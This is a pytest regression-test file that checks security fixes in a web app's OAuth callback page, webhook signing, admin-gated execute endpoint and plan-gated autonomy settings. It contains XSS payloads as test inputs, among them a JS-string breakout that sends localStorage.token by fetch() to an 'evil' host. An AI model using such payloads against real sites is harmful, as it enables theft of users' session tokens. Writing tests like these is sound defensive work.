"""
Phase 1 regression locks — each test fails against the pre-fix code.

Covers: S2 (OAuth reflected XSS), S3 (plan-gate bypass + module locks),
S5 (length-extendable webhook MAC), S6 (ungated execute endpoint).
"""

import hashlib
import hmac

import pytest
from fastapi import HTTPException

from tests.conftest import DEV_USER_ID


# ── S2: reflected XSS on the OAuth callback page ──────────────────────────

def test_oauth_page_escapes_html_context():
    from app.api.v1.integrations import _oauth_page
    body = _oauth_page(False, "<script>alert(1)</script>", "<img src=x onerror=alert(2)>", "s").body.decode()
    assert "<script>alert(1)</script>" not in body
    assert "<img src=x onerror=alert(2)>" not in body
    assert "&lt;script&gt;" in body


def test_oauth_page_escapes_js_string_context():
    """
    `state` lands inside a JS string literal. json.dumps emits a DOUBLE-quoted
    string, so a double-quote payload is what could actually break out — a
    single quote is legal inside it and needs no escaping.
    """
    from app.api.v1.integrations import _oauth_page
    payload = '";fetch("//evil/"+localStorage.token);//'
    body = _oauth_page(True, "t", "m", payload).body.decode()
    # Checking for the bare substring would be wrong: it legitimately appears
    # INSIDE the escaped form (\";fetch(). What matters is that no UNESCAPED
    # quote closes the literal. Isolate the rendered value and verify every
    # double-quote inside it is backslash-escaped.
    line = next(l for l in body.splitlines() if "postMessage" in l)
    inner = line.split('state:"', 1)[1].rsplit('"}', 1)[0]
    assert inner, "state value not found in rendered page"
    for i, ch in enumerate(inner):
        if ch == '"':
            assert i > 0 and inner[i - 1] == "\\", "unescaped quote breaks out of the JS string"


def test_oauth_page_escapes_script_close_in_state():
    """A literal </script> inside state must not terminate the script block."""
    from app.api.v1.integrations import _oauth_page
    body = _oauth_page(True, "t", "m", "</script><img src=x onerror=alert(1)>").body.decode()
    assert "</script><img" not in body


def test_oauth_page_does_not_broadcast_to_wildcard_in_production(monkeypatch):
    from app.config import settings
    from app.api.v1.integrations import _oauth_page
    monkeypatch.setattr(settings, "APP_ENV", "production")
    monkeypatch.setattr(settings, "APP_CORS_ORIGINS", "")
    body = _oauth_page(True, "t", "m", "s").body.decode()
    assert "postMessage" in body
    assert ', "*")' not in body and ", '*')" not in body


# ── S5: webhook MAC must be HMAC, not SHA256(secret ‖ body) ───────────────

def test_webhook_uses_hmac_not_secret_prefix(client, supa):
    secret, body = "hook-secret", '{"lead":"x"}'
    supa.seed("integrations", [{
        "id": "hook-1", "user_id": DEV_USER_ID, "module": "crm",
        "platform": "custom", "status": "active", "webhook_secret": secret,
    }])

    # The OLD construction must now be rejected.
    legacy = hashlib.sha256(f"{secret}{body}".encode()).hexdigest()
    r = client.post("/api/v1/integrations/inbound/hook-1", content=body,
                    headers={"X-NeuralOrbit-Signature": legacy})
    assert r.status_code == 401, "length-extendable SHA256(secret||body) still accepted"

    # The correct HMAC must be accepted.
    good = hmac.new(secret.encode(), body.encode(), hashlib.sha256).hexdigest()
    r = client.post("/api/v1/integrations/inbound/hook-1", content=body,
                    headers={"X-NeuralOrbit-Signature": good})
    assert r.status_code != 401


# ── S6: execute endpoint must be admin-gated ──────────────────────────────

async def test_execute_endpoint_requires_admin(monkeypatch):
    """A non-admin must be refused before any n8n workflow can fire."""
    from app.config import settings
    from app.auth import dependencies
    monkeypatch.setattr(settings, "AUTH_REQUIRED", False)

    non_admin = {"sub": "u1", "role": "authenticated"}   # no app_metadata.role
    with pytest.raises(HTTPException) as exc:
        await dependencies.get_admin_user(current_user=non_admin)
    assert exc.value.status_code == 403


def test_execute_route_declares_admin_dependency():
    """
    Structural guard: the route must not fall back to get_current_user.

    NOTE: this inspects the actual signature default, NOT the source text.
    A substring check on the source passes spuriously because the docstring
    mentions get_admin_user — mutation testing caught that.
    """
    import inspect
    from app.api.v1 import decisions
    from app.auth.dependencies import get_admin_user

    param = inspect.signature(decisions.execute_decision).parameters["current_user"]
    dependency = getattr(param.default, "dependency", None)
    assert dependency is get_admin_user, (
        f"execute endpoint is gated by {getattr(dependency, '__name__', dependency)}, "
        "expected get_admin_user"
    )


# ── S3: plan gating + module locks on POST /states/autonomy ───────────────

@pytest.fixture
def non_admin(monkeypatch):
    """Dev bypass returns an ADMIN by default; plan gates only apply to users."""
    from app.auth import dependencies
    monkeypatch.setattr(dependencies, "_DEV_USER", {
        "sub": DEV_USER_ID, "email": "u@x.c", "role": "authenticated",
        "app_metadata": {}, "user_metadata": {},
    })


def _seed_starter(supa, uid=DEV_USER_ID, locked=None):
    supa.seed("profiles", [{"id": uid, "plan": "starter", "role": "user"}])
    supa.seed("user_autonomy_config", [{
        "user_id": uid, "global_level": "assist", "crm": "assist",
        "marketing": "assist", "shield": "observe", "website": "assist",
        "locked_modules": locked or [],
    }])


def test_states_autonomy_rejects_level_above_plan(client, supa, non_admin):
    """A starter-plan user must not grant themselves 'autonomous' here."""
    _seed_starter(supa)
    r = client.post("/api/v1/states/autonomy", json={
        "global_level": "autonomous", "crm": "autonomous",
        "marketing": "assist", "shield": "observe", "website": "assist",
    })
    assert r.status_code == 403, "plan gate bypassed via /states/autonomy"


def test_states_autonomy_allows_level_within_plan(client, supa, non_admin):
    """Guard against over-correcting: allowed levels must still work."""
    _seed_starter(supa)
    r = client.post("/api/v1/states/autonomy", json={
        "global_level": "assist", "crm": "observe",
        "marketing": "assist", "shield": "observe", "website": "assist",
    })
    assert r.status_code == 200


def test_states_autonomy_honours_locked_modules(client, supa, non_admin):
    """An admin-locked module must keep its stored value."""
    _seed_starter(supa, locked=["crm"])
    r = client.post("/api/v1/states/autonomy", json={
        "global_level": "assist", "crm": "observe",   # attempt to change locked module
        "marketing": "assist", "shield": "observe", "website": "assist",
    })
    assert r.status_code == 200
    row = supa.table("user_autonomy_config").select("*").execute().data[0]
    assert row["crm"] == "assist", "locked module was overwritten"
